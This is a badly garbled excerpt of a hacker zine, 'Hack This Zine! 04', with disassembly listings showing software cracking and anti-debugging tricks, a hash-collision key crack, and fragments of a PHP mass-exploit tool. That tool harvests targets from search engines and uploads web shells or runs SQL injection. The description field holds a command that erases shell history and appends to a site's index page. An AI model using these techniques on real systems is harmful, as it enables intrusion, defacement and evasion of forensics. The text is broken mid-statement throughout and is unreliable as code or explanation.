---
title: "Hack This Zine! 04"
author: "HackThisSite.org"
date: "Mar 16, 2022"
category: "anarchism"
source: "https://theanarchistlibrary.org/library/hackthissite-org-hack-this-zine-04"
source_name: "theanarchistlibrary.org"
cover: ""
page_type: book
mirror_state: none
description: "unset HISTFILE; ./clean.sh; cat >> /var/www/hackthissite.org/html/index.php if co earc targetcoun imit ($ $x se,80,$e conte SQL $sploits ploit($b loits[$l );}} } }fu oit() // oit! fork); $l++) { $searchlimi exploit ighe "
tags:
  - "hacking"
  - "hacktivism"
images: []
...
################################################################################
                                               ...
                                               if         co        earc
                          targetcoun            imit      ($       $x           se,80,$e                       conte
                   SQL $sploits           ploit($b                  loits[$l
                  );}}  }  }fu              oit() //     oit!
                fork); $l++) {                 $searchlimi  exploit  ighe
        x = 0; $x SQLQ,$user,$
     oit routine { for ($l = 0; $l 
...
see a call to  where the result of a call to 0042A040 (this
...
004013AA  |. E8 C1F30000    |CALL                ; \strlen
...
me predict, "AAAAAAAAEZ" wil resolve to 720.... :).. YES! It works... Our collisive hash managed to  trick the
...
"
00401462  |. E8 69F30000    CALL                 ; |\printf
00401467  |. C70424 FFFFFFF>MOV DWORD PTR SS:[ESP],-1                ; |
0040146E  |. E8 4DF30000    CALL                   ; \exit
...
0040107B  |. E8 2D020000    CALL ; \GetDriveTypeA
...
004011A1  /$ E8 1F010000    CALL         ;
[GetTickCount
004011A6  |. 8BD8           MOV EBX,EAX
004011A8  |. CC             INT3
004011A9  |. E8 17010000    CALL         ;
[GetTickCount
...
apperently a check if the breakpoint is left intact 
  var
...
[2]. Dynamic (call by something like )         (seems a bit complicated? lol.)
...
{
char buff[BUFFSIZE];
for (int i = 0; i  MOV DWORD PTR SS:[EBP-40C],0
...
LEAVE,EBP is 0x0022FF (while it should be 0x0022FF78) and
...
now 0x0022FF.>) and this is a large drawback because we this REALLY makes this a
...
int main()
{
    ...
    for(int i = 0; i SQLQ, the sample exploit I included with this A/APE release required
...
$temp=explode("of about **",$html); // get number of results
$temp2=explode("** for ",$temp[1]);
$total=$temp2[0];
...
{ for ($l = 0; $l  $searchlimit) // not higher than limit
$targetcount = $searchlimit;
for ($x = 0; $x Sploit($base,80,$extend,$shellname,$shellcontent);
elseif($l == 1) // SQL
...
################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                           --> Make Contact  Join us on IRC  Visit Our Online Forums  Email Us  GET COPIES OF THE ZINE! 5pm for general access and hosts one-off and
